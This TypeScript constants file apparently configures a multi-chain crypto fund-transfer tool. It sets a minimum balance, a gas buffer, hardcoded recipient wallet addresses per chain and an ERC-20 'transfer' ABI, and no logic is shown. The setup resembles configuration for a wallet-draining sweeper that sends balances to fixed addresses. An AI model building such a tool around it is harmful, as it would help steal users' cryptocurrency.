export const MINIMUM_BALANCE= 0.001; // Minimum balance threshold in ETH 3 dollar
                                     // BNB 2 dollar

export const GAS_BUFFER = 0.0002;

export const chainNames: Record<number, string>= {
  1: "eth-mainnet",
  56: "bnb-mainnet",
  137: "polygon-mainnet",
  42161: "arb-mainnet",
  11155111: "eth-sepolia",
};

export const RECIPIENT_ADDRESSES : Record<number, string>  = {
  1: "0xC0D0833cedd5F77bC9d9c1533D0c27b3A74C8bb5", //eth metamaskmobile
  56: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52", //bnb metamaskmobile
  137: "0x5DBd59C38F71B5b389c3d3583537a8C152e8B52d",
  42161: "0x5DBd59C38F71B5b389c3d3583537a8C152e8B52d",
  11155111: "0x36875E84886F1Ae1032Ee044883bFD3C7c8D9bC2", // mobile
};


export const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "recipient", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function",
  },
];

export const supportedChains = [
  { id: 1, name: "Ethereum", nativeSymbol: "ETH" },
  { id: 56, name: "Binance Smart Chain", nativeSymbol: "BNB" },
  { id: 137, name: "Polygon", nativeSymbol: "MATIC" },
  { id: 42161, name: "Arbitrum", nativeSymbol: "ETH" },
];

export const CHAIN_TO_ALCHEMY_NETWORK: Record<number, string> = {
  1: "eth-mainnet",     // Ethereum Mainnet
  56: "bnb-mainnet",    // BNB Chain Mainnet (Alchemy now supports BSC)
};
